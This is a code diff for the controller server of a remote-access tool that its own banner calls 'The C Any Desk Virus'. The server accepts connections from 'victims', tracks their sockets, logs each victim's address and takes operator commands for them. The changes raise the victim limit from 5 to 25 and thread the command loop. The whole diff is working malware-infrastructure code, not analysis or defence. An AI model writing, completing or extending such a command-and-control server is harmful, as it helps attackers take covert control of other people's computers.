@@ -7,16 +7,16 @@
 
 #define PORT 44444
 #define IP "127.0.0.1"
-#define MAX_CONNECTED_VICTIMS 5
+#define MAX_CONNECTED_VICTIMS 25
 
 // Functions
-unsigned int __stdcall startServer();
-void getCommands();
+void startServer();
+unsigned int __stdcall getCommands();
 void processCommand(char *command);
 // Global varaibles
 int selectedVictimSocket = -1, connectedVictimsAmount = 0, victimsSockets[MAX_CONNECTED_VICTIMS];
 
-unsigned int __stdcall startServer()
+void startServer()
 {
     /*
     The func starts the server
@@ -35,7 +35,7 @@ unsigned int __stdcall startServer()
         exit(1);
     }
 
-    printf("\nStarting server...\n");
+    printf("Starting server...\n");
 
     // Creates the socket
     if ((serverSocDesc = socket(AF_INET, SOCK_STREAM, 0)) == -1)
@@ -63,18 +63,23 @@ unsigned int __stdcall startServer()
         exit(1);
     }
 
+    printf("Waiting for victims...\n");
+
+    _beginthreadex(0, 0, &getCommands, 0, 0, 0); // Commands thread
+
     while (true)
     {
         victimSocDesc = accept(serverSocDesc, (struct sockaddr *)&victimAddress, (socklen_t *)&victimAddressLen);
 
-        printf("a new victim has been conncted!\n");
+        printf("%s:%d has been conncted!\n", inet_ntoa(victimAddress.sin_addr), ntohs(victimAddress.sin_port));
+
         // Adds the victim socket descreption to the victims sockets array - [victimsSockets]
         victimsSockets[connectedVictimsAmount] = victimSocDesc;
         connectedVictimsAmount++;
     }
 }
 
-void getCommands()
+unsigned int __stdcall getCommands()
 {
     /*
     Let's the user enter an commands at live
@@ -177,8 +182,15 @@ void processCommand(char *command)
 
 int main(int argc, char const *argv[])
 {
-    _beginthreadex(0, 0, &startServer, 0, 0, 0); // Server thread
-    getCommands();
+    printf("%s%s%s\n", "-----------------------------------",
+           "Welcome To The C Any Desk Virus!",
+           "-----------------------------------");
+
+    // I want to get command only after the server will be up
+    // _beginthreadex(0, 0, &startServer, 0, 0, 0); // Server thread
+    // getCommands();
+
+    startServer();
 
     return 0;
 }
